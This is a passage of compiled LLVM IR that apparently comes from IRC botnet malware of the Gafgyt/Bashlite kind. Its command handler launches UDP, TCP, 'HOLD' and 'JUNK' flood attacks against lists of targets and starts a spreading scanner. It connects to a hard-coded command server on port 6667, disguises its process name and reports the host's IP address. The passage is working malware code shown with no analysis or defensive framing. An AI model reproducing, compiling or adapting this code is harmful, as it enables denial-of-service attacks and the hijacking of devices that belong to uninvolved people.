  %98 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %97
  %99 = load i64, i64* %98, align 8
  %100 = or i64 %95, %99
  store i64 %100, i64* %98, align 8
  store i64 0, i64* %38, align 8
  store i64 10000, i64* %39, align 8
  %101 = load i32, i32* %91, align 8
  %102 = add nsw i32 %101, 1
  %103 = call i32 @select(i32 %102, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.timeval* nonnull %6) #3
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %108, label %105

; <label>:105:                                    ; preds = %89
  %106 = load i32, i32* %91, align 8
  %107 = call i32 @close(i32 %106) #3
  store i8 0, i8* %44, align 4
  br label %108

; <label>:108:                                    ; preds = %62, %89, %.lr.ph, %61, %58, %86, %85, %105
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %109 = icmp slt i64 %indvars.iv.next, %40
  br i1 %109, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %110

; <label>:110:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.45, i64 0, i64 0))
  br label %274

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i64 0, i64 0)) #14
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i64 0, i64 0), i8* %15)
  br label %274

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i64 0, i64 0)) #14
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %47

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.49, i64 0, i64 0))
  br label %274

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i64 0, i64 0)) #14
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %35

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %274, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #3
  store i32 0, i32* @scanPid, align 4
  br label %35

; <label>:35:                                     ; preds = %25, %33
  %36 = load i8*, i8** %26, align 8
  %37 = tail call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i64 0, i64 0)) #14
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* @scanPid, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %274

; <label>:42:                                     ; preds = %39
  %43 = tail call i32 @fork() #3
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @str, i64 0, i64 0))
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %46, label %45

; <label>:45:                                     ; preds = %42
  store i32 %43, i32* @scanPid, align 4
  br label %274

; <label>:46:                                     ; preds = %42
  tail call void @StartTheLelz(i32 undef)
  unreachable

; <label>:47:                                     ; preds = %35, %17
  %48 = load i8*, i8** %1, align 8
  %49 = tail call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i64 0, i64 0)) #14
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %.loopexit136

; <label>:51:                                     ; preds = %47
  %52 = icmp slt i32 %0, 4
  br i1 %52, label %274, label %53

; <label>:53:                                     ; preds = %51
  %54 = getelementptr inbounds i8*, i8** %1, i64 2
  %55 = load i8*, i8** %54, align 8
  %56 = tail call i32 @atoi(i8* %55) #14
  %57 = icmp slt i32 %56, 1
  br i1 %57, label %274, label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds i8*, i8** %1, i64 3
  %60 = load i8*, i8** %59, align 8
  %61 = tail call i32 @atoi(i8* %60) #14
  %62 = icmp slt i32 %61, 1
  br i1 %62, label %274, label %63

; <label>:63:                                     ; preds = %58
  %64 = getelementptr inbounds i8*, i8** %1, i64 1
  %65 = load i8*, i8** %64, align 8
  %strchr = tail call i8* @strchr(i8* %65, i32 44)
  %66 = icmp eq i8* %strchr, null
  br i1 %66, label %73, label %.preheader135.preheader

.preheader135.preheader:                          ; preds = %63
  br label %.preheader135

.preheader135:                                    ; preds = %.preheader135.preheader, %69
  %.sink = phi i8* [ null, %69 ], [ %65, %.preheader135.preheader ]
  %67 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i64 0, i64 0)) #3
  %68 = icmp eq i8* %67, null
  br i1 %68, label %.loopexit136.loopexit, label %69

; <label>:69:                                     ; preds = %.preheader135
  %70 = tail call i32 @listFork()
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %.preheader135

; <label>:72:                                     ; preds = %69
  tail call void @sendHOLD(i8* nonnull %67, i32 %56, i32 %61)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:73:                                     ; preds = %63
  %74 = tail call i32 @listFork()
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %274

; <label>:76:                                     ; preds = %73
  tail call void @sendHOLD(i8* %65, i32 %56, i32 %61)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit136.loopexit:                            ; preds = %.preheader135
  br label %.loopexit136

.loopexit136:                                     ; preds = %.loopexit136.loopexit, %47
  %77 = load i8*, i8** %1, align 8
  %78 = tail call i32 @strcmp(i8* %77, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.54, i64 0, i64 0)) #14
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %.loopexit134

; <label>:80:                                     ; preds = %.loopexit136
  %81 = icmp slt i32 %0, 4
  br i1 %81, label %274, label %82

; <label>:82:                                     ; preds = %80
  %83 = getelementptr inbounds i8*, i8** %1, i64 2
  %84 = load i8*, i8** %83, align 8
  %85 = tail call i32 @atoi(i8* %84) #14
  %86 = icmp slt i32 %85, 1
  br i1 %86, label %274, label %87

; <label>:87:                                     ; preds = %82
  %88 = getelementptr inbounds i8*, i8** %1, i64 3
  %89 = load i8*, i8** %88, align 8
  %90 = tail call i32 @atoi(i8* %89) #14
  %91 = icmp slt i32 %90, 1
  br i1 %91, label %274, label %92

; <label>:92:                                     ; preds = %87
  %93 = getelementptr inbounds i8*, i8** %1, i64 1
  %94 = load i8*, i8** %93, align 8
  %strchr122 = tail call i8* @strchr(i8* %94, i32 44)
  %95 = icmp eq i8* %strchr122, null
  br i1 %95, label %104, label %.preheader133.preheader

.preheader133.preheader:                          ; preds = %92
  br label %.preheader133

.preheader133:                                    ; preds = %.preheader133.preheader, %98
  %.sink125 = phi i8* [ null, %98 ], [ %94, %.preheader133.preheader ]
  %96 = tail call i8* @strtok(i8* %.sink125, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i64 0, i64 0)) #3
  %97 = icmp eq i8* %96, null
  br i1 %97, label %.loopexit134.loopexit, label %98

; <label>:98:                                     ; preds = %.preheader133
  %99 = tail call i32 @listFork()
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %.preheader133

; <label>:101:                                    ; preds = %98
  tail call void @sendJUNK(i8* nonnull %96, i32 %85, i32 %90)
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = tail call i32 @close(i32 %102) #3
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:104:                                    ; preds = %92
  %105 = tail call i32 @listFork()
  %106 = icmp eq i32 %105, 0
  br i1 %106, label %107, label %274

; <label>:107:                                    ; preds = %104
  tail call void @sendJUNK(i8* %94, i32 %85, i32 %90)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit134.loopexit:                            ; preds = %.preheader133
  br label %.loopexit134

.loopexit134:                                     ; preds = %.loopexit134.loopexit, %.loopexit136
  %108 = load i8*, i8** %1, align 8
  %109 = tail call i32 @strcmp(i8* %108, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i64 0, i64 0)) #14
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %.loopexit132

; <label>:111:                                    ; preds = %.loopexit134
  %112 = icmp slt i32 %0, 6
  br i1 %112, label %274, label %113

; <label>:113:                                    ; preds = %111
  %114 = getelementptr inbounds i8*, i8** %1, i64 3
  %115 = load i8*, i8** %114, align 8
  %116 = tail call i32 @atoi(i8* %115) #14
  %117 = icmp eq i32 %116, -1
  br i1 %117, label %274, label %118

; <label>:118:                                    ; preds = %113
  %119 = getelementptr inbounds i8*, i8** %1, i64 2
  %120 = load i8*, i8** %119, align 8
  %121 = tail call i32 @atoi(i8* %120) #14
  %122 = icmp eq i32 %121, -1
  br i1 %122, label %274, label %123

; <label>:123:                                    ; preds = %118
  %124 = getelementptr inbounds i8*, i8** %1, i64 4
  %125 = load i8*, i8** %124, align 8
  %126 = tail call i32 @atoi(i8* %125) #14
  %127 = icmp eq i32 %126, -1
  br i1 %127, label %274, label %128

; <label>:128:                                    ; preds = %123
  %129 = getelementptr inbounds i8*, i8** %1, i64 5
  %130 = load i8*, i8** %129, align 8
  %131 = tail call i32 @atoi(i8* %130) #14
  %132 = icmp eq i32 %131, -1
  %133 = icmp sgt i32 %131, 65500
  %or.cond = or i1 %132, %133
  %134 = icmp sgt i32 %126, 32
  %or.cond126 = or i1 %134, %or.cond
  br i1 %or.cond126, label %274, label %135

; <label>:135:                                    ; preds = %128
  %136 = icmp eq i32 %0, 7
  br i1 %136, label %137, label %142

; <label>:137:                                    ; preds = %135
  %138 = getelementptr inbounds i8*, i8** %1, i64 6
  %139 = load i8*, i8** %138, align 8
  %140 = tail call i32 @atoi(i8* %139) #14
  %141 = icmp slt i32 %140, 1
  br i1 %141, label %274, label %142

; <label>:142:                                    ; preds = %137, %135
  %143 = getelementptr inbounds i8*, i8** %1, i64 1
  %144 = load i8*, i8** %143, align 8
  %145 = load i8*, i8** %119, align 8
  %146 = tail call i32 @atoi(i8* %145) #14
  %147 = load i8*, i8** %114, align 8
  %148 = tail call i32 @atoi(i8* %147) #14
  %149 = load i8*, i8** %124, align 8
  %150 = tail call i32 @atoi(i8* %149) #14
  %151 = load i8*, i8** %129, align 8
  %152 = tail call i32 @atoi(i8* %151) #14
  br i1 %136, label %153, label %157

; <label>:153:                                    ; preds = %142
  %154 = getelementptr inbounds i8*, i8** %1, i64 6
  %155 = load i8*, i8** %154, align 8
  %156 = tail call i32 @atoi(i8* %155) #14
  br label %157

; <label>:157:                                    ; preds = %142, %153
  %158 = phi i32 [ %156, %153 ], [ 10, %142 ]
  %strchr123 = tail call i8* @strchr(i8* %144, i32 44)
  %159 = icmp eq i8* %strchr123, null
  br i1 %159, label %166, label %.preheader131.preheader

.preheader131.preheader:                          ; preds = %157
  br label %.preheader131

.preheader131:                                    ; preds = %.preheader131.preheader, %162
  %.sink127 = phi i8* [ null, %162 ], [ %144, %.preheader131.preheader ]
  %160 = tail call i8* @strtok(i8* %.sink127, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i64 0, i64 0)) #3
  %161 = icmp eq i8* %160, null
  br i1 %161, label %.loopexit132.loopexit, label %162

; <label>:162:                                    ; preds = %.preheader131
  %163 = tail call i32 @listFork()
  %164 = icmp eq i32 %163, 0
  br i1 %164, label %165, label %.preheader131

; <label>:165:                                    ; preds = %162
  tail call void @sendUDP(i8* nonnull %160, i32 %146, i32 %148, i32 %150, i32 %152, i32 %158)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:166:                                    ; preds = %157
  %167 = tail call i32 @listFork()
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %169, label %274

; <label>:169:                                    ; preds = %166
  tail call void @sendUDP(i8* %144, i32 %146, i32 %148, i32 %150, i32 %152, i32 %158)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit132.loopexit:                            ; preds = %.preheader131
  br label %.loopexit132

.loopexit132:                                     ; preds = %.loopexit132.loopexit, %.loopexit134
  %170 = load i8*, i8** %1, align 8
  %171 = tail call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.56, i64 0, i64 0)) #14
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %.loopexit

; <label>:173:                                    ; preds = %.loopexit132
  %174 = icmp slt i32 %0, 6
  br i1 %174, label %274, label %175

; <label>:175:                                    ; preds = %173
  %176 = getelementptr inbounds i8*, i8** %1, i64 3
  %177 = load i8*, i8** %176, align 8
  %178 = tail call i32 @atoi(i8* %177) #14
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %274, label %180

; <label>:180:                                    ; preds = %175
  %181 = getelementptr inbounds i8*, i8** %1, i64 2
  %182 = load i8*, i8** %181, align 8
  %183 = tail call i32 @atoi(i8* %182) #14
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %274, label %185

; <label>:185:                                    ; preds = %180
  %186 = getelementptr inbounds i8*, i8** %1, i64 4
  %187 = load i8*, i8** %186, align 8
  %188 = tail call i32 @atoi(i8* %187) #14
  %189 = icmp eq i32 %188, -1
  %190 = icmp sgt i32 %188, 32
  %or.cond128 = or i1 %189, %190
  br i1 %or.cond128, label %274, label %191

; <label>:191:                                    ; preds = %185
  %192 = icmp sgt i32 %0, 6
  br i1 %192, label %193, label %.thread

; <label>:193:                                    ; preds = %191
  %194 = getelementptr inbounds i8*, i8** %1, i64 6
  %195 = load i8*, i8** %194, align 8
  %196 = tail call i32 @atoi(i8* %195) #14
  %197 = icmp slt i32 %196, 0
  br i1 %197, label %274, label %198

; <label>:198:                                    ; preds = %193
  %199 = icmp eq i32 %0, 8
  br i1 %199, label %200, label %.thread

; <label>:200:                                    ; preds = %198
  %201 = getelementptr inbounds i8*, i8** %1, i64 7
  %202 = load i8*, i8** %201, align 8
  %203 = tail call i32 @atoi(i8* %202) #14
  %204 = icmp slt i32 %203, 1
  br i1 %204, label %274, label %.thread

.thread:                                          ; preds = %191, %200, %198
  %205 = phi i1 [ true, %200 ], [ false, %198 ], [ false, %191 ]
  %206 = getelementptr inbounds i8*, i8** %1, i64 1
  %207 = load i8*, i8** %206, align 8
  %208 = load i8*, i8** %181, align 8
  %209 = tail call i32 @atoi(i8* %208) #14
  %210 = load i8*, i8** %176, align 8
  %211 = tail call i32 @atoi(i8* %210) #14
  %212 = load i8*, i8** %186, align 8
  %213 = tail call i32 @atoi(i8* %212) #14
  %214 = getelementptr inbounds i8*, i8** %1, i64 5
  %215 = load i8*, i8** %214, align 8
  br i1 %205, label %216, label %220

; <label>:216:                                    ; preds = %.thread
  %217 = getelementptr inbounds i8*, i8** %1, i64 7
  %218 = load i8*, i8** %217, align 8
  %219 = tail call i32 @atoi(i8* %218) #14
  br label %220

; <label>:220:                                    ; preds = %.thread, %216
  %221 = phi i32 [ %219, %216 ], [ 10, %.thread ]
  br i1 %192, label %222, label %226

; <label>:222:                                    ; preds = %220
  %223 = getelementptr inbounds i8*, i8** %1, i64 6
  %224 = load i8*, i8** %223, align 8
  %225 = tail call i32 @atoi(i8* %224) #14
  br label %226

; <label>:226:                                    ; preds = %220, %222
  %227 = phi i32 [ %225, %222 ], [ 0, %220 ]
  %strchr124 = tail call i8* @strchr(i8* %207, i32 44)
  %228 = icmp eq i8* %strchr124, null
  br i1 %228, label %235, label %.preheader130.preheader

.preheader130.preheader:                          ; preds = %226
  br label %.preheader130

.preheader130:                                    ; preds = %.preheader130.preheader, %231
  %.sink129 = phi i8* [ null, %231 ], [ %207, %.preheader130.preheader ]
  %229 = tail call i8* @strtok(i8* %.sink129, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i64 0, i64 0)) #3
  %230 = icmp eq i8* %229, null
  br i1 %230, label %.loopexit.loopexit, label %231

; <label>:231:                                    ; preds = %.preheader130
  %232 = tail call i32 @listFork()
  %233 = icmp eq i32 %232, 0
  br i1 %233, label %234, label %.preheader130

; <label>:234:                                    ; preds = %231
  tail call void @sendTCP(i8* nonnull %229, i32 %209, i32 %211, i32 %213, i8* %215, i32 %227, i32 %221)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:235:                                    ; preds = %226
  %236 = tail call i32 @listFork()
  %237 = icmp eq i32 %236, 0
  br i1 %237, label %238, label %274

; <label>:238:                                    ; preds = %235
  tail call void @sendTCP(i8* %207, i32 %209, i32 %211, i32 %213, i8* %215, i32 %227, i32 %221)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit.loopexit:                               ; preds = %.preheader130
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit132
  %239 = load i8*, i8** %1, align 8
  %240 = tail call i32 @strcmp(i8* %239, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #14
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %.preheader, label %269

.preheader:                                       ; preds = %.loopexit
  %242 = load i64, i64* @numpids, align 8
  %243 = icmp eq i64 %242, 0
  br i1 %243, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

._crit_edge.thread:                               ; preds = %.preheader
  %244 = load i32, i32* @mainCommSock, align 4
  br label %266

.lr.ph:                                           ; preds = %.lr.ph.preheader, %258
  %.0142 = phi i64 [ %259, %258 ], [ 0, %.lr.ph.preheader ]
  %.0117141 = phi i32 [ %.1, %258 ], [ 0, %.lr.ph.preheader ]
  %245 = load i32*, i32** @pids, align 8
  %246 = getelementptr inbounds i32, i32* %245, i64 %.0142
  %247 = load i32, i32* %246, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %258, label %249

; <label>:249:                                    ; preds = %.lr.ph
  %250 = tail call i32 @getpid() #3
  %251 = icmp eq i32 %247, %250
  br i1 %251, label %258, label %252

; <label>:252:                                    ; preds = %249
  %253 = load i32*, i32** @pids, align 8
  %254 = getelementptr inbounds i32, i32* %253, i64 %.0142
  %255 = load i32, i32* %254, align 4
  %256 = tail call i32 @kill(i32 %255, i32 9) #3
  %257 = add nsw i32 %.0117141, 1
  br label %258

; <label>:258:                                    ; preds = %249, %.lr.ph, %252
  %.1 = phi i32 [ %257, %252 ], [ %.0117141, %249 ], [ %.0117141, %.lr.ph ]
  %259 = add i64 %.0142, 1
  %260 = load i64, i64* @numpids, align 8
  %261 = icmp ult i64 %259, %260
  br i1 %261, label %.lr.ph, label %._crit_edge

._crit_edge:                                      ; preds = %258
  %262 = icmp sgt i32 %.1, 0
  %263 = load i32, i32* @mainCommSock, align 4
  br i1 %262, label %264, label %266

; <label>:264:                                    ; preds = %._crit_edge
  %265 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %263, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.58, i64 0, i64 0), i32 %.1)
  br label %269

; <label>:266:                                    ; preds = %._crit_edge.thread, %._crit_edge
  %267 = phi i32 [ %244, %._crit_edge.thread ], [ %263, %._crit_edge ]
  %268 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %267, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.59, i64 0, i64 0))
  br label %269

; <label>:269:                                    ; preds = %.loopexit, %264, %266
  %270 = load i8*, i8** %1, align 8
  %271 = tail call i32 @strcmp(i8* %270, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i64 0, i64 0)) #14
  %272 = icmp eq i32 %271, 0
  br i1 %272, label %273, label %274

; <label>:273:                                    ; preds = %269
  tail call void @exit(i32 0) #16
  unreachable

; <label>:274:                                    ; preds = %269, %235, %166, %104, %73, %39, %173, %175, %180, %185, %193, %200, %111, %113, %118, %123, %128, %137, %80, %82, %87, %51, %53, %58, %30, %45, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 6667, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #17
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.62, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.63, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i64 0, i64 0), i8** %1, align 8
  %7 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([9 x i8]* @.str.64 to i64), i32 0, i32 0, i32 0) #3
  %8 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %9 = tail call i32 @getpid() #3
  %10 = xor i32 %9, %8
  tail call void @srand(i32 %10) #3
  %11 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %12 = tail call i32 @getpid() #3
  %13 = xor i32 %12, %11
  tail call void @init_rand(i32 %13)
  %14 = tail call i32 @getOurIP()
  %15 = tail call i32 @fork() #3
  %16 = icmp eq i32 %15, 0
  br i1 %16, label %19, label %17

; <label>:17:                                     ; preds = %2
